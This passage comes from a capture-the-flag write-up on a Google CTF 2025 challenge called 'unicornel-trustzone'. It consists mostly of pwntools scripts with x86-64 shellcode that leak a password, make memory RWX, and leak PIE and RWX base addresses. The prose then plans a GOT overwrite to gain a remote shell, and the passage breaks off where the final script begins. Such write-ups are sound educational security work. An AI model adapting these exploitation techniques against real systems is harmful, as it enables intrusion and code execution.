+</span><span style=color:#b8bb26>        mov r12, 0xFFFFFFFFFFFFF000
+</span><span style=color:#b8bb26>        mov rbx, r12
+</span><span style=color:#b8bb26>        lea rcx, </span><span style=color:#fdf4c1>[rip+memprot_x86_64] 
+</span><span style=color:#b8bb26>        mov rax, 8 
+</span><span style=color:#b8bb26>        int 0x80
+</span><span style=color:#b8bb26>
+</span><span style=color:#b8bb26>        mov rbx, r12
+</span><span style=color:#b8bb26>        mov rcx, 0x10 </span><span style=font-style:italic;color:#928374>#to write 0x10 bytes from unicornel_write
+</span><span style=color:#b8bb26>        mov rax, 1 </span><span style=font-style:italic;color:#928374>#call unicornel_write
+</span><span style=color:#b8bb26>        int 0x80
+</span><span style=color:#b8bb26>        
+</span><span style=color:#b8bb26>        mov rax, 9
+</span><span style=color:#b8bb26>        int 0x80
+</span><span style=color:#b8bb26>        
+</span><span style=color:#b8bb26>        password:
+</span><span style=color:#b8bb26>            </span><span style=color:#d3869b>.</span><span style=color:#b8bb26>ascii "password\0"
+</span><span style=color:#b8bb26>        memprot_x86_64:
+</span><span style=color:#b8bb26>            </span><span style=color:#d3869b>.</span><span style=color:#b8bb26>ascii "memprot_x86_64\0"
+</span><span style=color:#b8bb26>        '''</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span>p </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>remote(</span><span style=color:#b8bb26>"unicornel-tz.2025.ctfcompetition.com"</span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>1337</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span style=color:#fdf4c1>p.recvuntil(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>' solve '</span><span style=color:#fdf4c1>)
+</span><span style=color:#fdf4c1>p.recvuntil(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>' solve '</span><span style=color:#fdf4c1>)
+</span><span>to_solve </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>p.recvline().strip().decode()
+</span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(</span><span style=color:#fa5c4b>f</span><span style=color:#b8bb26>"</span><span style=color:#fdf4c1>{to_solve}</span><span style=color:#b8bb26>"</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span>sol </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>os.popen(</span><span style=color:#fa5c4b>f</span><span style=color:#b8bb26>"python3 kctf-pow.py solve </span><span style=color:#fdf4c1>{to_solve}</span><span style=color:#b8bb26> 2>/dev/null"</span><span style=color:#fdf4c1>).read() </span><span style=font-style:italic;color:#928374>#kctf-pow solver
+</span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(sol)
+</span><span style=color:#fdf4c1>p.sendlineafter(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"Solution? "</span><span style=color:#fdf4c1>, sol.encode())
+</span><span>
+</span><span style=color:#fdf4c1>p.recvuntil(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>' unicornel!'</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span style=font-style:italic;color:#928374># Given format of header for the emulator
+</span><span>header </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>flat(
+</span><span style=color:#fdf4c1>    p32(unicorn.UC_ARCH_X86),
+</span><span style=color:#fdf4c1>    p32(unicorn.UC_MODE_64),
+</span><span style=color:#fdf4c1>    p64(</span><span style=color:#d3869b>0x1000</span><span style=color:#fdf4c1>), p64(</span><span style=color:#d3869b>0x1000</span><span style=color:#fdf4c1>),   
+</span><span style=color:#fdf4c1>    </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'\0' </span><span style=color:#fe8019>* </span><span style=color:#d3869b>3 </span><span style=color:#fe8019>* </span><span style=color:#d3869b>16</span><span style=color:#fdf4c1>,             
+</span><span style=color:#fdf4c1>    p16(</span><span style=color:#fabd2f>len</span><span style=color:#fdf4c1>(code)),             
+</span><span style=color:#fdf4c1>    p8(</span><span style=color:#d3869b>1</span><span style=color:#fdf4c1>)
+</span><span style=color:#fdf4c1>).ljust(</span><span style=color:#d3869b>80</span><span style=color:#fdf4c1>, </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'\0'</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span style=color:#fdf4c1>p.sendline(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>''</span><span style=color:#fdf4c1>)
+</span><span style=color:#fdf4c1>p.recvuntil(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'DATA_START'</span><span style=color:#fdf4c1>)
+</span><span style=color:#fdf4c1>p.send(header)
+</span><span style=color:#fdf4c1>p.recvuntil(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'CODE_START'</span><span style=color:#fdf4c1>)
+</span><span style=color:#fdf4c1>p.send(code)
+</span><span>
+</span><span style=color:#fdf4c1>p.recvuntil(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'pid 0\n'</span><span style=color:#fdf4c1>)
+</span><span>pwd </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>p.recv(</span><span style=color:#d3869b>0x10</span><span style=color:#fdf4c1>)
+</span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(pwd) </span><span style=font-style:italic;color:#928374>#leak the password
+</span><span>memprot_x86_64 </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>io.recv(</span><span style=color:#d3869b>0x100</span><span style=color:#fdf4c1>).strip(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'\x00'</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span style=font-style:italic;color:#928374># copy the values into files for local testing
+</span><span style=color:#fa5c4b>with </span><span style=color:#fabd2f>open</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>'password'</span><span style=color:#fdf4c1>, </span><span style=color:#b8bb26>'wb'</span><span style=color:#fdf4c1>) </span><span style=color:#fa5c4b>as </span><span>f:
+</span><span>    </span><span style=color:#fdf4c1>f.write(password)
+</span><span style=color:#fa5c4b>with </span><span style=color:#fabd2f>open</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>'memprot_x86_64'</span><span style=color:#fdf4c1>, </span><span style=color:#b8bb26>'wb'</span><span style=color:#fdf4c1>) </span><span style=color:#fa5c4b>as </span><span>f:
+</span><span>    </span><span style=color:#fdf4c1>f.write(memprot_x86_64)
+</span><span>
+</span></code></pre><p><code>password = sup3r_s3cure_sj\0</code> Since we’ve crossed our barrier of now being able to access <code>memprot</code> from the password we just leaked, we can give trustzones write access. So we can now overwrite a custom trustzone with our shellcode that can execute the <code>validate_handle</code> syscall. We will use the fact that <code>validate_handle</code> returns the address of the element in <code>shared_buffer</code>, that we will generate from <code>create_shared</code>.<pre class=language-python data-lang=python style=background:#282828;color:#fdf4c1aa><code class=language-python data-lang=python><span style=color:#fa5c4b>from </span><span>pwn </span><span style=color:#fa5c4b>import </span><span style=color:#d3869b>*
+</span><span style=color:#fa5c4b>import </span><span>unicorn 
+</span><span style=color:#fa5c4b>import </span><span>os 
+</span><span>
+</span><span>context.arch </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>"amd64"
+</span><span>
+</span><span>code </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>asm(
+</span><span style=color:#fdf4c1>        </span><span style=color:#fa5c4b>r</span><span style=color:#b8bb26>'''
+</span><span style=color:#b8bb26>        </span><span style=color:#d3869b>.</span><span style=color:#b8bb26>intel_syntax noprefix
+</span><span style=color:#b8bb26>        
+</span><span style=color:#b8bb26>        /</span><span style=color:#fe8019>*</span><span style=color:#b8bb26> create a shared buffer and generate handle 0 </span><span style=color:#fe8019>*</span><span style=color:#b8bb26>/
+</span><span style=color:#b8bb26>        mov rbx, 0x1000
+</span><span style=color:#b8bb26>        mov rax, 3
+</span><span style=color:#b8bb26>        int 0x80
+</span><span style=color:#b8bb26>        
+</span><span style=color:#b8bb26>        /</span><span style=color:#fe8019>*</span><span style=color:#b8bb26> call create_trustzone memprot_x86_64 with password to change perms to rwx </span><span style=color:#fe8019>*</span><span style=color:#b8bb26>/
+</span><span style=color:#b8bb26>        mov rbx, 0x4000
+</span><span style=color:#b8bb26>        lea rcx, </span><span style=color:#fdf4c1>[rip+memprot_x86_64]
+</span><span style=color:#b8bb26>        mov rax, 8
+</span><span style=color:#b8bb26>        int 0x80 
+</span><span style=color:#b8bb26>
+</span><span style=color:#b8bb26>        mov rbx, 0x4000     </span><span style=font-style:italic;color:#928374>#at vaddress 0x4000
+</span><span style=color:#b8bb26>        mov rcx, 0x1000     </span><span style=font-style:italic;color:#928374>#of length 0x1000
+</span><span style=color:#b8bb26>        mov rdx, 0x7        </span><span style=font-style:italic;color:#928374>#rwx
+</span><span style=color:#b8bb26>        lea rdi, </span><span style=color:#fdf4c1>[rip+password]
+</span><span style=color:#b8bb26>        mov rax, 10
+</span><span style=color:#b8bb26>        int 0x80
+</span><span style=color:#b8bb26>
+</span><span style=color:#b8bb26>        /</span><span style=color:#fe8019>*</span><span style=color:#b8bb26> overwrite trustzone to validate_handle and store return pointer at r12 and write </span><span style=color:#fe8019>*</span><span style=color:#b8bb26>/
+</span><span style=color:#b8bb26>        mov rdi, 0x4000
+</span><span style=color:#b8bb26>        lea rsi, </span><span style=color:#fdf4c1>[rip+leak_shared]
+</span><span style=color:#b8bb26>        lea rcx, </span><span style=color:#fdf4c1>[rip+leak_shared_end]
+</span><span style=color:#b8bb26>        sub rcx, rsi
+</span><span style=color:#b8bb26>        rep movsb
+</span><span style=color:#b8bb26>        mov rax, 10 </span><span style=font-style:italic;color:#928374>#call invoke_trustzone with the custom shellcode leak_shared at the created trustzone
+</span><span style=color:#b8bb26>        int 0x80
+</span><span style=color:#b8bb26>
+</span><span style=color:#b8bb26>        mov rax, 6
+</span><span style=color:#b8bb26>        int 0x80
+</span><span style=color:#b8bb26>        
+</span><span style=color:#b8bb26>        /</span><span style=color:#fe8019>*</span><span style=color:#b8bb26> custom code to validate_handle </span><span style=color:#fe8019>*</span><span style=color:#b8bb26>/
+</span><span style=color:#b8bb26>        leak_shared:
+</span><span style=color:#b8bb26>            xor rbx, rbx
+</span><span style=color:#b8bb26>            xor rcx, rcx
+</span><span style=color:#b8bb26>            mov rax, 4
+</span><span style=color:#b8bb26>            int 0x80 
+</span><span style=color:#b8bb26>            mov r12, rax
+</span><span style=color:#b8bb26>            
+</span><span style=color:#b8bb26>            /</span><span style=color:#fe8019>*</span><span style=color:#b8bb26> write address of created buffer </span><span style=color:#fe8019>*</span><span style=color:#b8bb26>/
+</span><span style=color:#b8bb26>            mov rbx, rax
+</span><span style=color:#b8bb26>            mov rax, 2
+</span><span style=color:#b8bb26>            int 0x80
+</span><span style=color:#b8bb26>        leak_shared_end:
+</span><span style=color:#b8bb26>
+</span><span style=color:#b8bb26>        password:
+</span><span style=color:#b8bb26>            </span><span style=color:#d3869b>.</span><span style=color:#b8bb26>ascii "sup3r_s3cure_sj\0"
+</span><span style=color:#b8bb26>        memprot_x86_64:
+</span><span style=color:#b8bb26>            </span><span style=color:#d3869b>.</span><span style=color:#b8bb26>ascii "memprot_x86_64\0"
+</span><span style=color:#b8bb26>    
+</span><span style=color:#b8bb26>'''</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span>p </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>remote(</span><span style=color:#b8bb26>"unicornel-tz.2025.ctfcompetition.com"</span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>1337</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span style=color:#fdf4c1>p.recvuntil(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>' solve '</span><span style=color:#fdf4c1>)
+</span><span style=color:#fdf4c1>p.recvuntil(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>' solve '</span><span style=color:#fdf4c1>)
+</span><span>to_solve </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>p.recvline().strip().decode()
+</span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(</span><span style=color:#fa5c4b>f</span><span style=color:#b8bb26>"</span><span style=color:#fdf4c1>{to_solve}</span><span style=color:#b8bb26>"</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span>sol </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>os.popen(</span><span style=color:#fa5c4b>f</span><span style=color:#b8bb26>"python3 kctf-pow.py solve </span><span style=color:#fdf4c1>{to_solve}</span><span style=color:#b8bb26> 2>/dev/null"</span><span style=color:#fdf4c1>).read() </span><span style=font-style:italic;color:#928374>#kctf-pow solver
+</span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(sol)
+</span><span style=color:#fdf4c1>p.sendlineafter(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"Solution? "</span><span style=color:#fdf4c1>, sol.encode())
+</span><span>
+</span><span style=color:#fdf4c1>p.recvuntil(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>' unicornel!'</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span style=font-style:italic;color:#928374># Given format of header for the emulator
+</span><span>header </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>flat(
+</span><span style=color:#fdf4c1>    p32(unicorn.UC_ARCH_X86),
+</span><span style=color:#fdf4c1>    p32(unicorn.UC_MODE_64),
+</span><span style=color:#fdf4c1>    p64(</span><span style=color:#d3869b>0x1000</span><span style=color:#fdf4c1>), p64(</span><span style=color:#d3869b>0x1000</span><span style=color:#fdf4c1>),         
+</span><span style=color:#fdf4c1>    </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'\0' </span><span style=color:#fe8019>* </span><span style=color:#d3869b>3 </span><span style=color:#fe8019>* </span><span style=color:#d3869b>16</span><span style=color:#fdf4c1>,             
+</span><span style=color:#fdf4c1>    p16(</span><span style=color:#fabd2f>len</span><span style=color:#fdf4c1>(code)),              
+</span><span style=color:#fdf4c1>    p8(</span><span style=color:#d3869b>1</span><span style=color:#fdf4c1>)                        
+</span><span style=color:#fdf4c1>).ljust(</span><span style=color:#d3869b>80</span><span style=color:#fdf4c1>, </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'\0'</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span style=color:#fdf4c1>p.sendline(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>''</span><span style=color:#fdf4c1>)
+</span><span style=color:#fdf4c1>p.recvuntil(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'DATA_START'</span><span style=color:#fdf4c1>)
+</span><span style=color:#fdf4c1>p.send(header)
+</span><span style=color:#fdf4c1>p.recvuntil(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'CODE_START'</span><span style=color:#fdf4c1>)
+</span><span style=color:#fdf4c1>p.send(code)
+</span><span>
+</span><span style=color:#fdf4c1>p.recvuntil(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'pid 0\n'</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span>leaked_buf_addr </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>int</span><span style=color:#fdf4c1>(p.recvline().strip().decode())
+</span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(</span><span style=color:#fa5c4b>f</span><span style=color:#b8bb26>'leaked addr = </span><span style=color:#fdf4c1>{</span><span style=color:#fabd2f>hex</span><span style=color:#fdf4c1>(leaked_buf_addr)}</span><span style=color:#b8bb26>'</span><span style=color:#fdf4c1>)
+</span></code></pre><p>This now gives us the leaked buffer. If you notice, the buffer address always ends with 012bf0, since PIE is enabled. Let’s analyse this with gdb.<p>Running vmmap we can see the memory mapping, and also obtain the PIE base. Also if you notice, the trustzone with modified RWX permission is also there. We need to be able to find this address as well to inject the shellcode for RCE<p><img alt="Memory map" src=https://exploiitm.github.io/blog/writeups/GoogleCTF2025/unicornel-trustzone/./rwx-section.png> <img alt src=https://exploiitm.github.io/blog/writeups/GoogleCTF2025/unicornel-trustzone/./pie-map.png><p>This is the shellcode to calculate and leak PIE base and RWX base.<pre class=language-python data-lang=python style=background:#282828;color:#fdf4c1aa><code class=language-python data-lang=python><span style=color:#fa5c4b>from </span><span>pwn </span><span style=color:#fa5c4b>import </span><span style=color:#d3869b>*
+</span><span style=color:#fa5c4b>import </span><span>unicorn 
+</span><span style=color:#fa5c4b>import </span><span>os 
+</span><span>
+</span><span>context.arch </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>"amd64"
+</span><span>
+</span><span>code </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>asm(
+</span><span style=color:#fa5c4b>r</span><span style=color:#b8bb26>'''
+</span><span style=color:#b8bb26>    </span><span style=color:#d3869b>.</span><span style=color:#b8bb26>intel_syntax noprefix
+</span><span style=color:#b8bb26>
+</span><span style=color:#b8bb26>    /</span><span style=color:#fe8019>*</span><span style=color:#b8bb26> create shared buffer</span><span style=color:#fe8019>*</span><span style=color:#b8bb26>/
+</span><span style=color:#b8bb26>    mov rbx, 0x1000
+</span><span style=color:#b8bb26>    mov rax, 3
+</span><span style=color:#b8bb26>    int 0x80 
+</span><span style=color:#b8bb26>
+</span><span style=color:#b8bb26>    /</span><span style=color:#fe8019>*</span><span style=color:#b8bb26> Call create_trustzone to change perms </span><span style=color:#fe8019>*</span><span style=color:#b8bb26>/
+</span><span style=color:#b8bb26>    mov rbx, 0x4000
+</span><span style=color:#b8bb26>    lea rcx, </span><span style=color:#fdf4c1>[rip + memprot_x86_64]
+</span><span style=color:#b8bb26>    mov rax, 8
+</span><span style=color:#b8bb26>    int 0x80
+</span><span style=color:#b8bb26>    
+</span><span style=color:#b8bb26>    mov rbx, 0x4000
+</span><span style=color:#b8bb26>    mov rcx, 0x1000
+</span><span style=color:#b8bb26>    mov rdx, 0x7
+</span><span style=color:#b8bb26>    lea rdi, </span><span style=color:#fdf4c1>[rip + password]
+</span><span style=color:#b8bb26>    mov rax, 10
+</span><span style=color:#b8bb26>    int 0x80
+</span><span style=color:#b8bb26>
+</span><span style=color:#b8bb26>    /</span><span style=color:#fe8019>*</span><span style=color:#b8bb26> overwrite trustzone to validate_handle and store return pointer at r12 and write </span><span style=color:#fe8019>*</span><span style=color:#b8bb26>/
+</span><span style=color:#b8bb26>    mov rdi, 0x4000
+</span><span style=color:#b8bb26>    lea rsi, </span><span style=color:#fdf4c1>[rip+leak_shared]
+</span><span style=color:#b8bb26>    lea rcx, </span><span style=color:#fdf4c1>[rip+leak_shared_end]
+</span><span style=color:#b8bb26>    sub rcx, rsi
+</span><span style=color:#b8bb26>    rep movsb
+</span><span style=color:#b8bb26>    mov rax, 10 </span><span style=font-style:italic;color:#928374>#call invoke_trustzone with the custom shellcode leak_shared at the created trustzone
+</span><span style=color:#b8bb26>    int 0x80
+</span><span style=color:#b8bb26>
+</span><span style=color:#b8bb26>    /</span><span style=color:#fe8019>*</span><span style=color:#b8bb26> leak PIE base and RWX base address </span><span style=color:#fe8019>*</span><span style=color:#b8bb26>/
+</span><span style=color:#b8bb26>    mov rdi, 0x4000
+</span><span style=color:#b8bb26>    lea rsi, </span><span style=color:#fdf4c1>[rip+leak_pie_rwx]
+</span><span style=color:#b8bb26>    lea rcx, </span><span style=color:#fdf4c1>[rip+leak_pie_rwx_end]
+</span><span style=color:#b8bb26>    sub rcx, rsi
+</span><span style=color:#b8bb26>    rep movsb
+</span><span style=color:#b8bb26>    mov rax, 10 </span><span style=font-style:italic;color:#928374>#call invoke trustzone to execute pie leak instructions
+</span><span style=color:#b8bb26>    int 0x80
+</span><span style=color:#b8bb26>
+</span><span style=color:#b8bb26>    mov rax, 0x6
+</span><span style=color:#b8bb26>    int 0x80
+</span><span style=color:#b8bb26>
+</span><span style=color:#b8bb26>    leak_shared:
+</span><span style=color:#b8bb26>        /</span><span style=color:#fe8019>*</span><span style=color:#b8bb26> Call validate_handle 0 </span><span style=color:#fe8019>*</span><span style=color:#b8bb26>/
+</span><span style=color:#b8bb26>        xor rbx, rbx
+</span><span style=color:#b8bb26>        xor rcx, rcx
+</span><span style=color:#b8bb26>        mov rax, 4
+</span><span style=color:#b8bb26>        int 0x80
+</span><span style=color:#b8bb26>        mov r12, rax </span><span style=font-style:italic;color:#928374># store leaked value at r12
+</span><span style=color:#b8bb26>        /</span><span style=color:#fe8019>*</span><span style=color:#b8bb26> Print leak for debugging purposes </span><span style=color:#fe8019>*</span><span style=color:#b8bb26>/
+</span><span style=color:#b8bb26>        mov rbx, rax
+</span><span style=color:#b8bb26>        mov rax, 0x2
+</span><span style=color:#b8bb26>        int 0x80
+</span><span style=color:#b8bb26>    leak_shared_end:
+</span><span style=color:#b8bb26>    leak_pie_rwx:
+</span><span style=color:#b8bb26>        /</span><span style=color:#fe8019>*</span><span style=color:#b8bb26> Call map_address </span><span style=color:#fe8019>*</span><span style=color:#b8bb26>/
+</span><span style=color:#b8bb26>        mov rbx, 0x5000
+</span><span style=color:#b8bb26>        mov rcx, 0x2000
+</span><span style=color:#b8bb26>        mov rdx, r12 # r12 is shared_buffers</span><span style=color:#fdf4c1>[0]
+</span><span style=color:#b8bb26>        sub rdx, 0x12bf0 # map to the base of area instead of to the shared_buffers</span><span style=color:#fdf4c1>[0]
+</span><span style=color:#b8bb26>        mov rax, 5
+</span><span style=color:#b8bb26>        int 0x80
+</span><span style=color:#b8bb26>        /</span><span style=color:#fe8019>*</span><span style=color:#b8bb26> Store leaked pie at r11 and leaked rwx at r10 </span><span style=color:#fe8019>*</span><span style=color:#b8bb26>/
+</span><span style=color:#b8bb26>        mov rbx, 0x5000
+</span><span style=color:#b8bb26>        add rbx, 0x1100
+</span><span style=color:#b8bb26>        mov r11, qword ptr </span><span style=color:#fdf4c1>[rbx]
+</span><span style=color:#b8bb26>        sub r11, 0x785b20 </span><span style=font-style:italic;color:#928374># r11 = PIE BASE
+</span><span style=color:#b8bb26>        mov rbx, 0x5000
+</span><span style=color:#b8bb26>        add rbx, 0x0b88
+</span><span style=color:#b8bb26>        mov r10, qword ptr </span><span style=color:#fdf4c1>[rbx]
+</span><span style=color:#b8bb26>        sub r10, 0x1c2f </span><span style=font-style:italic;color:#928374># r10 = RWX BASE
+</span><span style=color:#b8bb26>        /</span><span style=color:#fe8019>*</span><span style=color:#b8bb26> Print for debugging purposes </span><span style=color:#fe8019>*</span><span style=color:#b8bb26>/
+</span><span style=color:#b8bb26>        mov rbx, r11
+</span><span style=color:#b8bb26>        mov rax, 0x2
+</span><span style=color:#b8bb26>        int 0x80
+</span><span style=color:#b8bb26>        mov rbx, r10
+</span><span style=color:#b8bb26>        mov rax, 0x2
+</span><span style=color:#b8bb26>        int 0x80
+</span><span style=color:#b8bb26>    leak_pie_rwx_end:
+</span><span style=color:#b8bb26>    password:
+</span><span style=color:#b8bb26>        </span><span style=color:#d3869b>.</span><span style=color:#b8bb26>ascii "sup3r_s3cure_sj\0"
+</span><span style=color:#b8bb26>    memprot_x86_64:
+</span><span style=color:#b8bb26>        </span><span style=color:#d3869b>.</span><span style=color:#b8bb26>ascii "memprot_x86_64\0"'''</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span>p </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>remote(</span><span style=color:#b8bb26>"unicornel-tz.2025.ctfcompetition.com"</span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>1337</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span style=color:#fdf4c1>p.recvuntil(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>' solve '</span><span style=color:#fdf4c1>)
+</span><span style=color:#fdf4c1>p.recvuntil(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>' solve '</span><span style=color:#fdf4c1>)
+</span><span>to_solve </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>p.recvline().strip().decode()
+</span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(</span><span style=color:#fa5c4b>f</span><span style=color:#b8bb26>"</span><span style=color:#fdf4c1>{to_solve}</span><span style=color:#b8bb26>"</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span>sol </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>os.popen(</span><span style=color:#fa5c4b>f</span><span style=color:#b8bb26>"python3 kctf-pow.py solve </span><span style=color:#fdf4c1>{to_solve}</span><span style=color:#b8bb26> 2>/dev/null"</span><span style=color:#fdf4c1>).read() </span><span style=font-style:italic;color:#928374>#kctf-pow solver
+</span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(sol)
+</span><span style=color:#fdf4c1>p.sendlineafter(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"Solution? "</span><span style=color:#fdf4c1>, sol.encode())
+</span><span>
+</span><span style=color:#fdf4c1>p.recvuntil(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>' unicornel!'</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span style=font-style:italic;color:#928374># Given format of header for the emulator
+</span><span>header </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>flat(
+</span><span style=color:#fdf4c1>    p32(unicorn.UC_ARCH_X86),
+</span><span style=color:#fdf4c1>    p32(unicorn.UC_MODE_64),
+</span><span style=color:#fdf4c1>    p64(</span><span style=color:#d3869b>0x1000</span><span style=color:#fdf4c1>), p64(</span><span style=color:#d3869b>0x1000</span><span style=color:#fdf4c1>),          
+</span><span style=color:#fdf4c1>    </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'\0' </span><span style=color:#fe8019>* </span><span style=color:#d3869b>3 </span><span style=color:#fe8019>* </span><span style=color:#d3869b>16</span><span style=color:#fdf4c1>,              
+</span><span style=color:#fdf4c1>    p16(</span><span style=color:#fabd2f>len</span><span style=color:#fdf4c1>(code)),              
+</span><span style=color:#fdf4c1>    p8(</span><span style=color:#d3869b>1</span><span style=color:#fdf4c1>)                        
+</span><span style=color:#fdf4c1>).ljust(</span><span style=color:#d3869b>80</span><span style=color:#fdf4c1>, </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'\0'</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span style=color:#fdf4c1>p.sendline(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>''</span><span style=color:#fdf4c1>)
+</span><span style=color:#fdf4c1>p.recvuntil(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'DATA_START'</span><span style=color:#fdf4c1>)
+</span><span style=color:#fdf4c1>p.send(header)
+</span><span style=color:#fdf4c1>p.recvuntil(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'CODE_START'</span><span style=color:#fdf4c1>)
+</span><span style=color:#fdf4c1>p.send(code)
+</span><span style=color:#fdf4c1>p.recvuntil(</span><span style=color:#b8bb26>'pid 0\n'</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span>leaked_buf_addr </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>int</span><span style=color:#fdf4c1>(p.recvline().strip().decode())
+</span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(</span><span style=color:#fa5c4b>f</span><span style=color:#b8bb26>'</span><span style=color:#fdf4c1>{</span><span style=color:#fabd2f>hex</span><span style=color:#fdf4c1>(leaked_buf_addr) = }</span><span style=color:#b8bb26>'</span><span style=color:#fdf4c1>)
+</span><span>leaked_pie_base </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>int</span><span style=color:#fdf4c1>(p.recvline().strip().decode())
+</span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(</span><span style=color:#fa5c4b>f</span><span style=color:#b8bb26>'</span><span style=color:#fdf4c1>{</span><span style=color:#fabd2f>hex</span><span style=color:#fdf4c1>(leaked_pie_base) = }</span><span style=color:#b8bb26>'</span><span style=color:#fdf4c1>)
+</span><span>leaked_rwx_base </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>int</span><span style=color:#fdf4c1>(p.recvline().strip().decode())
+</span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(</span><span style=color:#fa5c4b>f</span><span style=color:#b8bb26>'</span><span style=color:#fdf4c1>{</span><span style=color:#fabd2f>hex</span><span style=color:#fdf4c1>(leaked_rwx_base) = }</span><span style=color:#b8bb26>'</span><span style=color:#fdf4c1>)
+</span></code></pre><p><img alt="Leaked addresses" src=https://exploiitm.github.io/blog/writeups/GoogleCTF2025/unicornel-trustzone/./leaked.png><p>If you remember the binary securities implemented in the beginning, we observed that relocation is set to Partial Relocation Read-Only. That means that this program is susceptible to GOT overwrite. So we can easily overwrite the GOT entry by mapping an address to the calculated GOT position from the known PIE base address. Let’s try to find the GOT address of write function so that we can gain remote shell access by running <code>unicornel_write</code>.<p><code>readelf -r chal | grep write</code> gives:<div class=textCenter><img alt="Alt Text" src=/writeups/GoogleCTF2025/unicornel-trustzone/write-got.png></div><p>The final exploit script is<pre class=language-python data-lang=python style=background:#282828;color:#fdf4c1aa><code class=language-python data-lang=python><span style=color:#fa5c4b>from </span><span>pwn </span><span style=color:#fa5c4b>import </span><span style=color:#d3869b>*
+</span><span style=color:#fa5c4b>import </span><span>unicorn 
+</span><span style=color:#fa5c4b>import </span><span>os 
+</span><span>
+</span><span>context.arch </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>"amd64"
+</span><span style=font-style:italic;color:#928374>#context.log_level = 'debug'
+</span><span>
+</span><span>code </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>asm(
+</span><span style=color:#fa5c4b>r</span><span style=color:#b8bb26>'''
+</span><span style=color:#b8bb26>    </span><span style=color:#d3869b>.</span><span style=color:#b8bb26>intel_syntax noprefix
+</span><span style=color:#b8bb26>
+</span><span style=color:#b8bb26>    /</span><span style=color:#fe8019>*</span><span style=color:#b8bb26> create shared buffer</span><span style=color:#fe8019>*</span><span style=color:#b8bb26>/
